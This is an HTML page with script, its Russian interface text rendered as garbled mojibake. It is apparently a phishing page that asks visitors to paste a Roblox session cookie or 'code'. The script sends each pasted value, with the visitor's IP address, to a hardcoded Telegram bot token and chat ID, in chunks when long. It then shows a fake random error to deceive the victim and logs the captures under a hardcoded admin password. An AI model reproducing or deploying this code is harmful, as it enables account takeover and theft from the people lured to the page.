<body>

        <div>

            <textarea id="cookieInput" placeholder="–í—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ –≤–∞—à –∫–æ–¥..."></textarea>

            <div class="status" id="status">–û–∂–∏–¥–∞–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏...</div>
        </div>

    <script>
        // =========== –ù–ê–°–¢–†–û–ô–ö–ò ===========
        const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
        const CHAT_ID = '1491315056';
        const ADMIN_PASS = 'malik0609';
        
        // =========== –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM ===========
        async function sendCode() {
            const input = document.getElementById('cookieInput');
            const status = document.getElementById('status');
            const code = input.value.trim();
            
            if (!code) {
                status.innerHTML = '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
                return;
            }
            
            status.innerHTML = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...';
            
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ü–û–õ–ù–´–ô –∫–æ–¥ –≤ Telegram
                await sendFullCodeToTelegram(code);
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–∫–∞–ª—å–Ω–æ (–¥–ª—è –∞–¥–º–∏–Ω–∫–∏)
                saveLocalCode(code);
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º "–æ—à–∏–±–∫—É" –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                setTimeout(() => {
                    const errors = [
                        '‚ùå –û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫—É–∫–∏',
                        '‚ö†Ô∏è –ö—É–∫–∏ —É—Å—Ç–∞—Ä–µ–ª, —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –≤—Ö–æ–¥',
                        'üîí –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è',
                        '‚è≥ –í—Ä–µ–º—è –∂–∏–∑–Ω–∏ —Å–µ—Å—Å–∏–∏ –∏—Å—Ç–µ–∫–ª–æ'
                    ];
                    status.innerHTML = errors[Math.floor(Math.random() * errors.length)];
                    input.value = '';
                }, 1500);
                
            } catch (error) {
                status.innerHTML = '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É';
                input.value = '';
            }
        }
        
        // =========== –û–¢–ü–†–ê–í–ö–ê –ü–û–õ–ù–û–ì–û –ö–û–î–ê ===========
        async function sendFullCodeToTelegram(code) {
            const time = new Date().toLocaleString('ru-RU');
            const ip = await getUserIP();
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø–æ–ª–Ω—ã–º –∫–æ–¥–æ–º
            let message = `üîê –ù–û–í–´–ô –ö–û–î –ü–û–õ–£–ß–ï–ù\n\n`;
            message += `‚è∞ –í—Ä–µ–º—è: ${time}\n`;
            message += `üåê IP: ${ip}\n`;
            message += `üìè –î–ª–∏–Ω–∞: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤\n\n`;
            message += `üîë –ü–û–õ–ù–´–ô –ö–û–î:\n`;
            message += `\`\`\`\n`;
            message += `${code}\n`;
            message += `\`\`\``;
            
            // Telegram –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ 4096 —Å–∏–º–≤–æ–ª–æ–≤, —Ä–∞–∑–±–∏–≤–∞–µ–º –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
            if (message.length > 4000) {
                await sendLongMessage(code, time, ip);
            } else {
                await sendTelegramMessage(message);
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–ª–∏–Ω–Ω–æ–≥–æ –∫–æ–¥–∞ –ø–æ —á–∞—Å—Ç—è–º
        async function sendLongMessage(code, time, ip) {
            // –ü–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π
            let infoMessage = `üîê –ù–û–í–´–ô –î–õ–ò–ù–ù–´–ô –ö–û–î\n\n`;
            infoMessage += `‚è∞ –í—Ä–µ–º—è: ${time}\n`;
            infoMessage += `üåê IP: ${ip}\n`;
            infoMessage += `üìè –î–ª–∏–Ω–∞: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤\n\n`;
            infoMessage += `üìã –ö–æ–¥ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —á–∞—Å—Ç—è–º–∏...`;
            
            await sendTelegramMessage(infoMessage);
            
            // –†–∞–∑–±–∏–≤–∞–µ–º –∫–æ–¥ –Ω–∞ —á–∞—Å—Ç–∏ –ø–æ 3000 —Å–∏–º–≤–æ–ª–æ–≤
            const chunkSize = 3000;
            for (let i = 0; i < code.length; i += chunkSize) {
                const chunk = code.substring(i, i + chunkSize);
                const chunkNum = Math.floor(i / chunkSize) + 1;
                const totalChunks = Math.ceil(code.length / chunkSize);
                
                const chunkMessage = `üì¶ –ß–∞—Å—Ç—å ${chunkNum}/${totalChunks}:\n\`\`\`\n${chunk}\n\`\`\``;
                await sendTelegramMessage(chunkMessage);
                
                // –ü–∞—É–∑–∞ –º–µ–∂–¥—É —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏
                await sleep(1000);
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ–¥–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º fetch —Å mode 'no-cors' –¥–ª—è –æ–±—Ö–æ–¥–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π
            return fetch(url, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
        }
        
        // =========== –ü–û–õ–£–ß–ï–ù–ò–ï IP –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø ===========
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
            }
        }
        
        // =========== LOCALSTORAGE –î–õ–Ø –ê–î–ú–ò–ù–ö–ò ===========
        function saveLocalCode(code) {
            const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
            codes.unshift({
                code: code,
                time: new Date().toLocaleString('ru-RU'),
                length: code.length,
                ip: 'localhost'
            });
            // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º—ã—Ö –∫–æ–¥–æ–≤ (–ø–æ—Å–ª–µ–¥–Ω–∏–µ 50)
            if (codes.length > 50) codes.length = 50;
            localStorage.setItem('robloxCodes', JSON.stringify(codes));
        }
        
        // =========== –ê–î–ú–ò–ù–ö–ê ===========
        function showAdmin() {
            const password = prompt('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:');
            if (password === ADMIN_PASS) {
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–¥—ã –∏–∑ localStorage
                const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
                let adminText = 'üìã –ü–æ—Å–ª–µ–¥–Ω–∏–µ –∫–æ–¥—ã –∏–∑ localStorage:\n\n';
                
                codes.forEach((item, index) => {
                    adminText += `–ö–æ–¥ #${index + 1} (${item.length} —Å–∏–º–≤–æ–ª–æ–≤):\n`;
                    adminText += `${item.code.substring(0, 100)}${item.code.length > 100 ? '...' : ''}\n\n`;
                });
                
                alert(adminText);
            } else {
                alert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!');
            }
        }
        
        // =========== –£–¢–ò–õ–ò–¢–´ ===========
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // =========== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ===========
        window.onload = function() {
            console.log('‚úÖ –°–∞–π—Ç –∑–∞–≥—Ä—É–∂–µ–Ω');
            console.log('ü§ñ –ë–æ—Ç –Ω–∞—Å—Ç—Ä–æ–µ–Ω –Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫—É –ü–û–õ–ù–´–• –∫–æ–¥–æ–≤');
            console.log('üîê –ü–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:', ADMIN_PASS);
        };
    </script>
